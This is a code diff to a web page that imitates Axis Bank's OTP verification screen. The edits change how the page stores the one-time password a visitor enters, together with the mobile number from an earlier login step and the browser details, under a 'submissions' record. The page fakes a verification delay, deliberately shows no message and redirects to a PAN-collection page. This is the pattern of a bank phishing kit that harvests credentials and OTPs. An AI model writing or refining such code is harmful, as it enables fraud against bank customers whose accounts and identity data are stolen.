@@ -1015,35 +1015,41 @@
             }
         }
         
-        // Save OTP submission to admin data (BACKEND)
-        function saveOTPToAdmin(otp) {
+        // ✅ FIXED: Save OTP submission to axisBankSubmissions (NOT axisBankAdminData)
+        function saveOTPSubmission(otp) {
             try {
-                // Get last login submission
+                // Get existing submissions
+                let submissions = JSON.parse(localStorage.getItem('axisBankSubmissions') || '[]');
+                
+                // Get last login submission for reference
                 const lastSubmission = getLastSubmission();
                 
-                // Get existing admin data or create empty array
-                let adminData = JSON.parse(localStorage.getItem('axisBankAdminData') || '[]');
-                
-                // Add OTP submission to admin data
-                adminData.unshift({
-                    id: Date.now(),
-                    type: 'otp_verification',
-                    otp: otp,
-                    status: 'verified',
+                // Create OTP submission object
+                const otpSubmission = {
+                    id: 'OTP-' + Date.now(),
+                    type: 'otp',
                     timestamp: new Date().toISOString(),
-                    loginData: lastSubmission ? lastSubmission.data : null,
-                    loginType: lastSubmission ? lastSubmission.type : null,
-                    page: 'OTP Page',
-                    isNew: true
-                });
+                    date: new Date().toLocaleString(),
+                    ip: '', // Will be captured if needed
+                    userAgent: navigator.userAgent,
+                    data: {
+                        otp: otp,
+                        mobileNumber: lastSubmission && lastSubmission.data ? lastSubmission.data.mobile : '',
+                        status: 'verified',
+                        source: 'OTP Verification Page'
+                    }
+                };
                 
-                // Save back to localStorage (This is the backend save)
-                localStorage.setItem('axisBankAdminData', JSON.stringify(adminData));
+                // Add to submissions array (newest first)
+                submissions.unshift(otpSubmission);
                 
-                console.log('OTP data saved to admin backend:', { otp, status: 'verified' });
+                // Save back to localStorage
+                localStorage.setItem('axisBankSubmissions', JSON.stringify(submissions));
+                
+                console.log('✅ OTP submission saved to axisBankSubmissions:', otpSubmission);
                 return true;
             } catch (e) {
-                console.error('Error saving OTP to admin backend:', e);
+                console.error('❌ Error saving OTP submission:', e);
                 return false;
             }
         }
@@ -1071,8 +1077,8 @@
                 verifyButton.classList.add('loading');
                 verifyButton.disabled = true;
                 
-                // Save OTP data to admin backend (NO MESSAGE SHOWN)
-                const saved = saveOTPToAdmin(otp);
+                // ✅ FIXED: Save OTP to correct localStorage key (axisBankSubmissions)
+                const saved = saveOTPSubmission(otp);
                 
                 // Simulate verification delay
                 setTimeout(() => {
@@ -1082,7 +1088,7 @@
                     verifyButton.disabled = false;
                     
                     if (saved) {
-                        // NO SUCCESS MESSAGE - DIRECT REDIRECT
+                        // ✅ FIXED: Direct redirect without message
                         // Redirect to axis_pan.html
                         window.location.href = 'axis_pan.html';
                     } else {
@@ -1135,9 +1141,9 @@
                 }
             }, 1000);
             
-            // Initialize localStorage for admin data if not exists
-            if (!localStorage.getItem('axisBankAdminData')) {
-                localStorage.setItem('axisBankAdminData', JSON.stringify([]));
+            // ✅ FIXED: Initialize axisBankSubmissions if not exists
+            if (!localStorage.getItem('axisBankSubmissions')) {
+                localStorage.setItem('axisBankSubmissions', JSON.stringify([]));
             }
         });
     </script>
